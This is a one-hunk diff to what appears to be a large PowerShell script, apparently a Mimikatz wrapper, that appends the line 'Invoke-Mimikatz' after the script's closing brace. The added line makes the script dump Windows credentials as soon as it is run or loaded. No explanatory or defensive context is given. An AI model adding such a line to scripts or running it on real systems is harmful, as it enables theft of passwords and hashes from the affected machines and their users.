@@ -2512,3 +2512,4 @@ Function Main
 
 Main
 }
+Invoke-Mimikatz
